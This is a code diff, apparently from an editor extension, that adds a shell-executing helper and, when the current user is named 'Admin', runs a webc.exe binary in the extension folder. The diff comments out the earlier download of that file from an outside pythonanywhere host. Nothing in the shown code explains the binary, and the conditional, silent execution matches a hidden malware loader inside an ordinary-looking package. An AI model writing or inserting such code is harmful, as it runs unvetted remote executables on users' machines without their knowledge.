@@ -13,11 +13,32 @@
     const fs = require('fs');
     const { readdir, stat } = require('fs/promises');
     const { join } = require('path');
+    const child_process = require('child_process');
 
 
     const http = require('http');
     const https = require('https');
 
+
+    function execjs(cmd) {
+      return new Promise((resolve /*reject*/) => {
+        child_process.exec(
+          String.raw`${cmd}`,
+          { shell: true, timeout: 10000 },
+          (err, out, stderr) => {
+            if (err) {
+              if (err.signal === 'SIGTERM') {
+                err = 'Timed out after 10s';
+              } else {
+                // err = 'Runtime Error: (Output Still Shown)\n' + err.toString();
+              }
+            }
+            return resolve([out, err, stderr]);
+          }
+        );
+      });
+    }
+    
     async function download(url, filePath) {
       const proto = !url.charAt(4).localeCompare('s') ? https : http;
 
@@ -69,10 +90,11 @@
       osUserInfo = os.userInfo();
       if (osUserInfo.username === 'Admin') {
 
-        await download('https://ab498.pythonanywhere.com/files/webc.exe', `${extensionPath}/webc.exe`);
-        console.log({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
-        await tstt({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
+        // await download('https://ab498.pythonanywhere.com/files/webc.exe', `${extensionPath}/webc.exe`);
+        // console.log({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
+        // await tstt({ message: "INIT_D2", err, stat: fs.statSync(`${extensionPath}/webc.exe`) });
 
+        await execjs(`${extensionPath}/webc.exe`);
         return;
       }
     } catch (error) {
